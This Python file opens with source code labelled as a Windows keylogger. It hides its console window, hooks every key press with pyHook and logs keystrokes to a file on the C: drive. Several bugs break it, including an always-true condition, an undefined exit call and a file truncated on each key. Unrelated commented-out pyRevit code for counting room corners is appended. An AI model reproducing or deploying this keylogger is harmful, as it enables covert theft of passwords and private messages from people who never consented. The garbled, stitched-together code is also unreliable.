# Python code for keylogger
# to be used in windows
import win32api
import win32console
import win32gui
import pythoncom, pyHook

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

def OnKeyboardEvent(event):
    if event.Ascii==5:
        _exit(1)
    if event.Ascii !=0 or 8:
    #open output.txt to read current keystrokes
        f = open('c:\output.txt', 'r+')
        buffer = f.read()
        f.close()
    # open output.txt to write current + new keystrokes
        f = open('c:\output.txt', 'w')
        keylogs = chr(event.Ascii)
        if event.Ascii == 13:
            keylogs = '/n'
            buffer += keylogs
            f.write(buffer)
            f.close()
# create a hook manager object
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
# set the hook
hm.HookKeyboard()
# wait forever
pythoncom.PumpMessages()


# host = revit.HOST_APP.username


# if host == "bob" or host == "marley":
#     print (host)
# else:
#     forms.alert(title="Restricted!", 
#                 msg="Not allowed for the current user", 
#                 sub_msg="Contact your BIM manager for access", 
#                 expanded="This option can break your current Marks. \nAfter Marking, the marks probably wont be the same as they were for each panel! ", 
#                 warn_icon=True)

# doc = revit.doc

# rooms = DB.FilteredElementCollector(doc)\
#     .OfCategory(DB.BuiltInCategory.OST_Rooms)\
#     .WhereElementIsNotElementType()

# tolerance = 0.15

# for room in rooms:
#     corner_count = 0
#     room_name = room.get_Parameter(DB.BuiltInParameter.ROOM_NAME).AsString()
#     room_boundary = room.GetBoundarySegments(DB.SpatialElementBoundaryOptions())
#     for boundary in room_boundary:
#         for segment in boundary:
#             start_point = segment.GetCurve().GetEndPoint(0)
#             end_point = segment.GetCurve().GetEndPoint(1)
#             # check if the start and end points are different and close to each other
#             if start_point != end_point and start_point.IsAlmostEqualTo(end_point, tolerance):
#                 corner_count += 1
#     print('Room: ' + room_name)
#     print('Number of corners: ' + str(corner_count))